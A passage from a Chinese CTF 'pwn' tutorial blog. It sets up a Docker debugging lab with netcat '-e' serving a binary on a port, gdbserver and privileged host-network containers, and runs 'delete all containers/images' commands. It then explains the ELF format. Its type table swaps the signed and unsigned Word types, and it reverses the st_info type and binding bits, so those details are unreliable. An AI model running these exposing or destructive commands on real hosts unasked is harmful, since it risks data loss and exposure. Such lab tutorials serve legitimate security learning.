<li>进容器 shell ，即同一个容器再开一个 shell 。  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> docker <span class="built_in">exec</span> -it -w /home/ctf 容器ID /bin/bash</span><br></pre></td></tr></table></figure></div></li>
<li>停止所有容器：  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">docker stop $(docker ps -a -q)</span><br></pre></td></tr></table></figure></div></li>
<li>删除所有容器：  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> $(docker ps -a -q)</span><br></pre></td></tr></table></figure></div></li>
<li>删除所有镜像：  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">docker rmi $(docker images -q)</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p><code>exp.py</code> 模板如下：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">8888</span>) <span class="comment"># nc 连接远程程序</span></span><br><span class="line"></span><br><span class="line">gdb.attach(target=(<span class="string">&quot;localhost&quot;</span>, <span class="number">9999</span>), exe=<span class="string">&quot;./pwn&quot;</span>, gdbscript=<span class="string">&quot;&quot;</span>) <span class="comment"># gdb 连接 docker 中的 gdbserver 调试 ./pwn</span></span><br><span class="line"></span><br><span class="line">pause() <span class="comment"># 阻塞脚本直到 gdb 成功连接 gdbserver防止程序跑飞</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">r.sendlineafter(&quot;xxxx&quot;, &quot;xxx&quot;) # 脚本远程交互</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
<ul>
<li>运行脚本前首先在 docker 容器中用 <code>netcat</code> 将题目程序 IO 映射到 8888 端口：  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">./netcat -lvp 8888 -e ./pwn</span><br></pre></td></tr></table></figure></div></li>
<li>运行脚本，阻塞在 <code>gdb.attach</code> 时脚本已经与远程的 <code>netcat</code> 连接，此时 docker 镜像中已经有 <code>pwn</code> 这个进程了。此时使用 <code>ps -aux | grep pwn</code> 查看进程 <code>pid</code> 然后运行如下命令让 <code>gdbserver</code> 附加进程并监听 9999 端口。  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">gdbserver :9999 --attach 进程pid</span><br></pre></td></tr></table></figure></div></li>
<li>此时脚本执行 <code>gdb.attach</code> 连接 docker 中的 <code>gdbserver</code> 并阻塞在 <code>pause()</code> 上直到 <code>gdb</code> 成功连接 <code>gdbserver</code> 。</li>
<li>在脚本运行窗口按回车解除阻塞进行调试。</li>
</ul>
<p>其中 docker 中的操作可以通过脚本自动化实现。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">IMAGE_NAME=minipy-debug</span><br><span class="line">CONTAINER_HOME=/home/ctf</span><br><span class="line">PROG_NAME=minipy</span><br><span class="line">NC_PORT=8888</span><br><span class="line">DBG_PORT=9999</span><br><span class="line"></span><br><span class="line"><span class="comment"># load image</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="subst">$(docker images | grep $&#123;IMAGE_NAME&#125; | wc -l)</span>&quot;</span> -lt <span class="string">&quot;1&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    docker load -i <span class="variable">$&#123;IMAGE_NAME&#125;</span>.tar</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># start continer</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="subst">$(docker ps | grep $&#123;IMAGE_NAME&#125; | wc -l)</span>&quot;</span> -lt <span class="string">&quot;1&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line"><span class="comment">#   docker run --privileged -itd -p $&#123;DBG_PORT&#125;:$&#123;DBG_PORT&#125; -p $&#123;NC_PORT&#125;:$&#123;NC_PORT&#125; $&#123;IMAGE_NAME&#125;</span></span><br><span class="line">    docker run --privileged -itd --net=host <span class="variable">$&#123;IMAGE_NAME&#125;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get continer id</span></span><br><span class="line">CONTAINER_ID=$(docker ps -q --filter <span class="string">&quot;ancestor=<span class="variable">$&#123;IMAGE_NAME&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># cp files</span></span><br><span class="line">docker <span class="built_in">cp</span> ./tools/gdbserver <span class="variable">$&#123;CONTAINER_ID&#125;</span>:<span class="variable">$&#123;CONTAINER_HOME&#125;</span></span><br><span class="line">docker <span class="built_in">cp</span> ./tools/netcat <span class="variable">$&#123;CONTAINER_ID&#125;</span>:<span class="variable">$&#123;CONTAINER_HOME&#125;</span></span><br><span class="line">docker <span class="built_in">cp</span> ./<span class="variable">$&#123;PROG_NAME&#125;</span> <span class="variable">$&#123;CONTAINER_ID&#125;</span>:<span class="variable">$&#123;CONTAINER_HOME&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># start run</span></span><br><span class="line">docker <span class="built_in">exec</span> -itd -w <span class="variable">$&#123;CONTAINER_HOME&#125;</span> <span class="variable">$&#123;CONTAINER_ID&#125;</span> /bin/bash -c <span class="string">&quot;./netcat -lvp <span class="variable">$&#123;NC_PORT&#125;</span> -e ./<span class="variable">$&#123;PROG_NAME&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">read</span></span><br><span class="line"></span><br><span class="line">docker <span class="built_in">exec</span> -it -w <span class="variable">$&#123;CONTAINER_HOME&#125;</span> <span class="variable">$&#123;CONTAINER_ID&#125;</span> /bin/bash -c <span class="string">&quot;ps -ef | grep <span class="variable">$&#123;PROG_NAME&#125;</span> | grep -v &#x27;grep&#x27; | grep -v &#x27;\-c&#x27; | awk &#x27;&#123;print \$2&#125;&#x27; | xargs ./gdbserver :<span class="variable">$&#123;DBG_PORT&#125;</span> --attach&quot;</span></span><br><span class="line"><span class="built_in">read</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#docker stop $&#123;CONTAINER_ID&#125;</span></span><br><span class="line"><span class="comment">#docker rm $&#123;CONTAINER_ID&#125;</span></span><br><span class="line"></span><br><span class="line">docker stop $(docker ps -a -q)</span><br><span class="line">docker <span class="built_in">rm</span> $(docker ps -a -q)</span><br></pre></td></tr></table></figure></div>
<h1 id="ELF-文件格式"><a href="#ELF-文件格式" class="headerlink" title="ELF 文件格式"></a>ELF 文件格式</h1><p>ELF（Executable and Linkable Format）是一种常见的可执行文件和可链接文件格式，主要用于Linux和类Unix系统。ELF 文件可以包含不同的类型，常见的 ELF 文件类型包括：</p>
<ul>
<li>可执行文件（<code>ET_EXEC</code>）：这种类型的 ELF 文件是可直接执行的程序，可以在操作系统上运行。</li>
<li>共享目标文件（<code>ET_DYN</code>）：这种类型的 ELF 文件是可被动态链接的共享库，可以在运行时与其他程序动态链接。该类型文件后缀名为 <code>.so</code> 。</li>
<li>可重定位文件（<code>ET_REL</code>）：这种类型的 ELF 文件是编译器生成的目标文件，通常用于将多个目标文件链接到一个可执行文件或共享库中。该类型文件后缀名为 <code>.o</code> ，静态链接库（<code>.a</code>）也可以归为这一类。</li>
<li>核心转储文件（<code>ET_CORE</code>）：这种类型的 ELF 文件是操作系统在程序崩溃或发生错误时生成的核心转储文件，用于调试和分析程序崩溃的原因。</li>
</ul>
<p>ELF 文件结构及相关常数被定义在 <code>/usr/include/elf.h</code> 里，因为 ELF 文件在各种平台下都通用，ELF文件有 32 位版本和 64 位版本。32 位版本与 64 位版本的 ELF 文件的格式基本是一样的（部分结构体为了优化对齐后大小调整了成员的顺序），只不过有些成员的大小不一样。</p>
<p><code>elf.h</code> 使用 typedef 定义了一套自己的变量体系：</p>
<table>
<thead>
<tr>
<th>自定义类型</th>
<th>描述</th>
<th>原始类型</th>
<th>长度（字节）</th>
</tr>
</thead>
<tbody><tr>
<td><code>Elf32_Addr</code></td>
<td>32 位版本程序地址</td>
<td><code>uint32_t</code></td>
<td>4</td>
</tr>
<tr>
<td><code>Elf32_Half</code></td>
<td>32 位版本的无符号短整型</td>
<td><code>uint16_t</code></td>
<td>2</td>
</tr>
<tr>
<td><code>Elf32_Off</code></td>
<td>32 位版本的偏移地址</td>
<td><code>uint32_t</code></td>
<td>4</td>
</tr>
<tr>
<td><code>Elf32_Sword</code></td>
<td>32 位版本有符号整型</td>
<td><code>uint32_t</code></td>
<td>4</td>
</tr>
<tr>
<td><code>Elf32_Word</code></td>
<td>32 位版本无符号整型</td>
<td><code>int32_t</code></td>
<td>4</td>
</tr>
<tr>
<td><code>Elf64_Addr</code></td>
<td>64 位版本程序地址</td>
<td><code>uint64_t</code></td>
<td>8</td>
</tr>
<tr>
<td><code>Elf64_Half</code></td>
<td>64 位版本的无符号短整型</td>
<td><code>uint16_t</code></td>
<td>2</td>
</tr>
<tr>
<td><code>Elf64_Off</code></td>
<td>64 位版本的偏移地址</td>
<td><code>uint64_t</code></td>
<td>8</td>
</tr>
<tr>
<td><code>Elf64_Sword</code></td>
<td>64 位版本有符号整型</td>
<td><code>uint32_t</code></td>
<td>4</td>
</tr>
<tr>
<td><code>Elf64_Word</code></td>
<td>64 位版本无符号整型</td>
<td><code>int32_t</code></td>
<td>4</td>
</tr>
</tbody></table>
<p>ELF 主要管理结构为文件头，程序头表（可重定位文件没有）和节表，其他部分有一个个节组成，多个属性相同的节构成一个段。对于节的介绍这里按照静态链接相关和动态链接相关分别介绍。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/image-20241108001735862.png"
                      alt="image-20241108001735862" style="zoom:33%;" 
                >

<h2 id="文件头"><a href="#文件头" class="headerlink" title="文件头"></a>文件头</h2><p>我们这里以 32 位版本的文件头结构 <code>Elf32_Ehdr</code> 作为例子来描述，它的定义如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* The ELF file header.  This appears at the start of every ELF file.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EI_NIDENT (16)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	e_ident[EI_NIDENT];	<span class="comment">/* Magic number and other info */</span></span><br><span class="line">  Elf32_Half	e_type;			<span class="comment">/* Object file type */</span></span><br><span class="line">  Elf32_Half	e_machine;		<span class="comment">/* Architecture */</span></span><br><span class="line">  Elf32_Word	e_version;		<span class="comment">/* Object file version */</span></span><br><span class="line">  Elf32_Addr	e_entry;		<span class="comment">/* Entry point virtual address */</span></span><br><span class="line">  Elf32_Off	e_phoff;		<span class="comment">/* Program header table file offset */</span></span><br><span class="line">  Elf32_Off	e_shoff;		<span class="comment">/* Section header table file offset */</span></span><br><span class="line">  Elf32_Word	e_flags;		<span class="comment">/* Processor-specific flags */</span></span><br><span class="line">  Elf32_Half	e_ehsize;		<span class="comment">/* ELF header size in bytes */</span></span><br><span class="line">  Elf32_Half	e_phentsize;		<span class="comment">/* Program header table entry size */</span></span><br><span class="line">  Elf32_Half	e_phnum;		<span class="comment">/* Program header table entry count */</span></span><br><span class="line">  Elf32_Half	e_shentsize;		<span class="comment">/* Section header table entry size */</span></span><br><span class="line">  Elf32_Half	e_shnum;		<span class="comment">/* Section header table entry count */</span></span><br><span class="line">  Elf32_Half	e_shstrndx;		<span class="comment">/* Section header string table index */</span></span><br><span class="line">&#125; Elf32_Ehdr;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><strong><code>e_ident</code>：ELF 文件的魔数和其他信息。</strong><ul>
<li>前 4 字节为 <code>ELFMAG</code> 即 <code>\x7fELF</code> 。</li>
<li>第 5 字节为 ELF 文件类型，值为 <code>ELFCLASS32(1)</code> 代表 32 位，值为 <code>ELFCLASS64(2)</code> 代表 64 位。 </li>
<li>第 6 字节为 ELF 的字节序，0 为无效格式，1 为小端格式，2 为大端格式。</li>
<li>第 7 字节为 ELF 版本，一般为 1 ，即 1.2 版本。</li>
<li>后面 9 字节没有定义一般填 0 ，有些平台会使用这 9 个字节作为扩展标志。</li>
</ul>
</li>
<li><strong><code>e_type</code>：表示ELF文件类型，如可执行文件、共享对象文件（<code>.so</code>）、可重定位文件（<code>.o</code>）等。</strong></li>
<li><code>e_machine</code>：表示目标体系结构，即程序的目标平台，如 x86、ARM 等。相关常量以 <code>EM_</code> 开头。</li>
<li><code>e_version</code>：ELF 文件版本号，一般为常数 1 。</li>
<li><strong><code>e_entry</code>：表示程序入口点虚拟地址。操作系统加载完程序后从这个地址开始执行进程的命令。可重定位文件一般没有入口地址，则这个值为 0 。</strong></li>
<li><strong><code>e_phoff</code>：表示程序头表的文件偏移量。</strong></li>
<li><strong><code>e_shoff</code>：表示节表的文件偏移量。</strong></li>
<li><code>e_flags</code>：表示处理器特定标志。</li>
<li><strong><code>e_ehsize</code>：表示 ELF 文件头的大小。</strong></li>
<li><strong><code>e_phentsize</code>：表示程序头表中每个表项的大小。</strong></li>
<li><strong><code>e_phnum</code>：表示程序头表中表项的数量。</strong></li>
<li><strong><code>e_shentsize</code>：表示节表中每个表项的大小。</strong></li>
<li><strong><code>e_shnum</code>：表示节表中表项的数量。</strong></li>
<li><code>e_shstrndx</code>：<strong>表示节表中字符串表的索引。</strong></li>
</ul>
<h2 id="程序头表"><a href="#程序头表" class="headerlink" title="程序头表"></a>程序头表</h2><p>ELF 可执行文件中有一个专门的数据结构叫做程序头表（Program Header Table）用来保存<strong>段</strong>（<strong>注意不是节</strong>）的信息。因为 ELF <strong>目标文件</strong>不需要被装载，所以它没有程序头表，而 ELF 的<strong>可执行文件</strong>和<strong>共享库文件</strong>都有程序头表。</p>
<p>程序头表是由 <code>Elf*_Phdr</code> 组成的数组，用于描述 ELF 文件中每个节的属性和信息。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Program segment header.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word	p_type;			<span class="comment">/* Segment type */</span></span><br><span class="line">  Elf32_Off	p_offset;		<span class="comment">/* Segment file offset */</span></span><br><span class="line">  Elf32_Addr	p_vaddr;		<span class="comment">/* Segment virtual address */</span></span><br><span class="line">  Elf32_Addr	p_paddr;		<span class="comment">/* Segment physical address */</span></span><br><span class="line">  Elf32_Word	p_filesz;		<span class="comment">/* Segment size in file */</span></span><br><span class="line">  Elf32_Word	p_memsz;		<span class="comment">/* Segment size in memory */</span></span><br><span class="line">  Elf32_Word	p_flags;		<span class="comment">/* Segment flags */</span></span><br><span class="line">  Elf32_Word	p_align;		<span class="comment">/* Segment alignment */</span></span><br><span class="line">&#125; Elf32_Phdr;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>p_type</code>：段的类型，例如可执行段、数据段等。</li>
<li><code>p_offset</code>：段在文件中的偏移量。</li>
<li><code>p_vaddr</code>：段在虚拟内存中的起始地址。</li>
<li><code>p_paddr</code>：段在物理内存中的起始地址。因为 ELF 还没装载不知道物理地址，所以作为保留字段。通常和 <code>p_vaddr</code> 的值是一样的。</li>
<li><code>p_filesz</code>：段在文件中的大小。</li>
<li><code>p_memsz</code>：段在内存中的大小。</li>
<li><code>p_flags</code>：段的标志，例如可读、可写、可执行等。</li>
<li><code>p_align</code>：段在文件和内存中的对齐方式。段的的加载地址要能被 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mtext>p_align</mtext></msup></mrow><annotation encoding="application/x-tex">2^{\text{p\_align}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord text mtight"><span class="mord mtight">p_align</span></span></span></span></span></span></span></span></span></span></span></span></span> 整除。</li>
</ul>
<h2 id="节表"><a href="#节表" class="headerlink" title="节表"></a>节表</h2><p>ELF文件里面定义一个固定长度的 <code>Elf*_Shdr</code> 结构体数组用来存放<strong>节</strong>相关信息，与 PE 文件的节表相似。</p>
<blockquote>
<p>在 ELF 文件中，<strong>段</strong>（Segment）和<strong>节</strong>（Section）是两个不同的概念，它们在文件结构中具有不同的作用和目的。<br><br>段（Segment）是一种逻辑上的组织单位，它定义了可执行文件或共享库在内存中的一个连续区域。每个段都有自己的虚拟地址空间，可以包含多个节。常见的段类型包括代码段（<code>.text</code>），数据段（<code>.data</code>、<code>.bss</code>），只读数据段（<code>.rodata</code>）等。段在加载和执行时被操作系统用来管理内存，设置内存保护属性以及指定虚拟地址空间的起始地址和大小。<br><br>节（Section）是一种更细粒度的组织单位，它包含了文件中的特定类型的数据或代码。每个节都有自己的名字、类型和内容。常见的节类型包括代码节（<code>.text</code>），数据节（<code>.data</code>、<code>.bss</code>），只读数据节（<code>.rodata</code>），符号表节（<code>.symtab</code>），字符串表节（<code>.strtab</code>）等。节不直接参与内存的加载和执行，而是用于链接器（Linker）和调试器（Debugger）等工具对文件进行处理和分析。<br><br><strong>通俗的讲，在装载程序的时候为了节省内存会将 ELF 文件中属性相同的节（Section）合并成在一个段（Segment）加载到内存中。</strong><br><br>段和节之间存在对应关系和映射关系：</p>
<ul>
<li>一个段可以包含多个节，这些节的内容和属性都属于该段。</li>
<li>段提供了对应于虚拟内存的逻辑映射，而节则提供了对应于文件的逻辑映射。</li>
<li>段的加载和执行涉及内存管理和地址映射，而节则用于链接和调试过程中的符号解析、重定位等操作。</li>
</ul>
</blockquote>
<p>其中 <code>Elf32_Shdr</code> 定义如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Section header.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word	sh_name;		<span class="comment">/* Section name (string tbl index) */</span></span><br><span class="line">  Elf32_Word	sh_type;		<span class="comment">/* Section type */</span></span><br><span class="line">  Elf32_Word	sh_flags;		<span class="comment">/* Section flags */</span></span><br><span class="line">  Elf32_Addr	sh_addr;		<span class="comment">/* Section virtual addr at execution */</span></span><br><span class="line">  Elf32_Off	sh_offset;		<span class="comment">/* Section file offset */</span></span><br><span class="line">  Elf32_Word	sh_size;		<span class="comment">/* Section size in bytes */</span></span><br><span class="line">  Elf32_Word	sh_link;		<span class="comment">/* Link to another section */</span></span><br><span class="line">  Elf32_Word	sh_info;		<span class="comment">/* Additional section information */</span></span><br><span class="line">  Elf32_Word	sh_addralign;		<span class="comment">/* Section alignment */</span></span><br><span class="line">  Elf32_Word	sh_entsize;		<span class="comment">/* Entry size if section holds table */</span></span><br><span class="line">&#125; Elf32_Shdr;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><strong><code>sh_name</code>：表示节的名称在字符串表中的索引。字符串表节存储了所有节的名称，<code>sh_name</code> 指定了节的名称在字符串表中的位置。</strong></li>
<li><strong><code>sh_type</code>：表示节的类型，指定了节的用途和属性。常见的类型包括代码段（<code>SHT_PROGBITS(1)</code>）、数据段（<code>SHT_PROGBITS(1)</code>）、符号表（<code>SHT_SYMTAB(2)</code>）、字符串表（<code>SHT_STRTAB(3)</code>）等。</strong></li>
<li><code>sh_flags</code>：表示节的标志，用于描述节的特性和属性。标志的具体含义取决于节的类型和上下文。</li>
<li><strong><code>sh_addr</code>：表示节的虚拟地址，只在可执行文件中有意义。对于可执行文件，<code>sh_addr</code> 指定了节在内存中的加载地址，如果该节不可被加载，则该值为 0 。</strong></li>
<li><strong><code>sh_offset</code>：表示节在文件中的偏移量，指定了节在文件中的位置。对于 bss 段来说该值没有意义。</strong></li>
<li><strong><code>sh_size</code>：表示节的大小，指定了节所占据的字节数。</strong></li>
<li><code>sh_link</code>：表示链接到的其他节的索引，用于建立节之间的关联关系，具体含义依赖于节的类型。</li>
<li><code>sh_info</code>：附加信息，具体含义依赖于节的类型。</li>
<li><code>sh_addralign</code>：表示节的地址对齐要求，指定了节在内存中的对齐方式。即 <code>sh_addr</code> 需要满足 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>sh_addr</mtext><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><msup><mn>2</mn><mtext>sh_addralign</mtext></msup><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">\text{sh\_addr} \mod 2^{\text{sh\_addralign}} = 0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"></span><span class="mord text"><span class="mord">sh_addr</span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord text mtight"><span class="mord mtight">sh_addralign</span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> 。如果 <code>sh_addralign</code> 为 0 或 1 表示该段没有对齐要求。</li>
<li><strong><code>sh_entsize</code>：表示节中每个项的大小，如果该字段为 0 说明节中不包含固定大小的项。</strong></li>
</ul>
<p>ELF 中常见的节如下：</p>
<ul>
<li><code>.text</code>：代码段（Code Section），用于存储程序的可执行指令。</li>
<li><code>.rodata</code>：只读数据段（Read-Only Data Section），用于存储只读的常量数据，例如字符串常量。</li>
<li><code>.data</code>：数据段（Data Section），用于存储已初始化的全局变量和静态变量。</li>
<li><code>.bss</code>：未初始化的数据段（Block Started by Symbol），用于存储未初始化的全局变量和静态变量。它不占用实际的文件空间，而是在运行时由系统自动初始化为零。</li>
<li><code>.symtab</code>：符号表节（Symbol Table Section），用于存储程序的符号表信息，包括函数、变量和其他符号的名称、类型和地址等。</li>
<li><code>.strtab</code>：字符串表节（String Table Section），用于存储字符串数据，如节名称、符号名称等。字符串表节被多个其他节引用，通过偏移量和索引来访问具体的字符串。</li>
<li><code>.rel.text</code> 或 <code>.rela.text</code>：代码重定位节（Relocation Section），用于存储代码段中的重定位信息，以便在链接时修正代码中的符号引用。</li>
<li><code>.rel.data</code> 或 <code>.rela.data</code>：数据重定位节（Relocation Section），用于存储数据段中的重定位信息，以便在链接时修正数据段中的符号引用。</li>
<li><code>.dynamic</code>：动态节（Dynamic Section），用于存储程序的动态链接信息，包括动态链接器需要的重定位表、共享对象的名称、版本信息等。</li>
<li><code>.note</code>：注释节（Note Section），用于存储与程序或库相关的注释或调试信息。</li>
</ul>
<h2 id="静态链接相关"><a href="#静态链接相关" class="headerlink" title="静态链接相关"></a>静态链接相关</h2><p><strong>注意：静态链接相关只在可重定位文件中存在。比如可执行文件，如果不开启 PIE 加载地址固定，不需要对自身进行重定位，而开启 PIE 后为地址无关代码，也不需要对自身进行重定位。因此不需要静态链接也就丢弃了静态链接相关的节。</strong></p>
<h3 id="符号表（-symtab）"><a href="#符号表（-symtab）" class="headerlink" title="符号表（.symtab）"></a>符号表（.symtab）</h3><p><strong>注意：符号表除了静态链接外没有用，但是程序为了方便调试会保留符号表，我们可以通过 <code>strip + 程序名</code> 的方式将符号表去除，这就是为什么有的 pwn 题的附件没有函数和变量名而有的却有。</strong></p>
<p>ELF 文件中的符号表往往是文件中的一个段，段名一般叫 <code>.symtab</code> 。符号表是一个 <code>Elf*_Sym</code> 结构（32 位 ELF 文件）的数组，每个 <code>Elf*_Sym</code> 结构对应一个符号。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Symbol table entry.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word	st_name;		<span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  Elf32_Addr	st_value;		<span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf32_Word	st_size;		<span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_info;		<span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_other;		<span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf32_Section	st_shndx;		<span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>st_name</code>：符号名称在<strong>字符串</strong>表中的偏移量。</li>
<li><code>st_value</code>：符号的值，即符号的地址或偏移量。<ul>
<li>如果该符号在<strong>目标文件</strong>中，如果是符号的定义并且该符号不是 <code>COMMON</code> 块类型的则 <code>st_value</code> 表示该符号在段中的<strong>偏移</strong>。</li>
<li>在<strong>目标文件</strong>中，如果符号是 <code>COMMON</code> 块类型的则 <code>st_value</code> 表示该符号的<strong>对齐属性</strong>。</li>
<li>在<strong>可执行文件</strong>中，<code>st_value</code> 表示符号的<strong>虚拟地址</strong>。</li>
</ul>
</li>
<li><code>st_size</code>：符号的大小，如果符号是一个函数，则表示函数的大小。如果该值为 0 表示符号的大小为 0 或未知。</li>
<li><code>st_info</code>：该字段是一个字节，包含符号的类型和绑定信息。符号类型包括函数、数据、对象等，符号绑定包括局部符号、全局符号、弱符号等。该字段的高 4 位表示符号的类型，低 4 位表示符号的绑定信息。</li>
<li><code>st_other</code>：保留字段，通常为 0 。</li>
<li><code>st_shndx</code>：通常为符号所在<strong>节</strong>的索引。<ul>
<li>如果符号是一个常量，该字段为 <code>SHN_ABS</code>（初始值不为 0 的全局变量） 或 <code>SHN_COMMON</code>（初始值为 0 的全局变量）。</li>
<li>如果该符号未定义但是在该文件中被引用到，说明该符号可能定义在其他目标文件中，则该字段为 <code>SHN_UNDEF</code> 。</li>
</ul>
</li>
</ul>
<h3 id="重定位表（-rel-text-rel-data）"><a href="#重定位表（-rel-text-rel-data）" class="headerlink" title="重定位表（.rel.text&#x2F;.rel.data）"></a>重定位表（.rel.text&#x2F;.rel.data）</h3><p>重定位表是一个 <code>Elf*_Rel</code> 结构的数组，每个数组元素对应一个重定位入口。重定位表主要有<code>.rel.text</code> 或 <code>.rela.text</code>，即代码重定位节（Relocation Section）和 <code>.rel.data</code> 或 <code>.rela.data</code>：数据重定位节（Relocation Section）。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Relocation table entry without addend (in section of type SHT_REL).  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr	r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">  Elf32_Word	r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>r_offset</code>：需要进行重定位的位置的偏移量或地址。这个位置通常是指令中的某个操作数或数据的地址，需要在链接时进行修正，以便正确地引用目标符号。<ul>
<li>对于可执行文件或共享库，<code>r_offset</code> 表示需要修改的位置在内存中的位置（用于动态链接）。</li>
<li>对于<strong>可重定位文件</strong>，<code>r_offset</code> 表示需要修改的位置相对于段起始位置的偏移（用于静态链接）。</li>
</ul>
</li>
<li><code>r_info</code>：低 8 位表示符号的重定位类型，重定位类型指定了进行何种类型的修正，例如绝对重定位、PC 相对重定位等。高 24 位表示该符号在<strong>符号表</strong>中的索引，用于解析重定位所引用的符号。</li>
</ul>
